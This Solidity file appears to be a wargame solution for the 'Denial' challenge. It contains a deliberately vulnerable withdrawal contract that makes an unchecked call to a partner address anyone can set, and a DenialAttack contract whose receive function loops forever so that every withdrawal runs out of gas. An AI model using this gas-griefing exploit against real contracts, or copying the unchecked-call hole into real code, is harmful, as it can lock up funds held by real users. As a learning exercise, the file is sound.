// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0xdA24f50a1B67Ee352c72e424978644c65490A35B
contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public payable {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract DenialAttack {
    Denial public denial;

    constructor(Denial denial_) {
        denial = denial_;
        denial.setWithdrawPartner(address(this));
    }

    // When receiving ether, burn all gass
    // assert(false) no longer works in Solidity >0.8.5,
    // because the assert blockccode is not reachable.
    // Instead, we create a while loop that will never end.
    receive() external payable {
        uint a = 0;
        while (true) {
            a = a + 1;
        }
    }
}

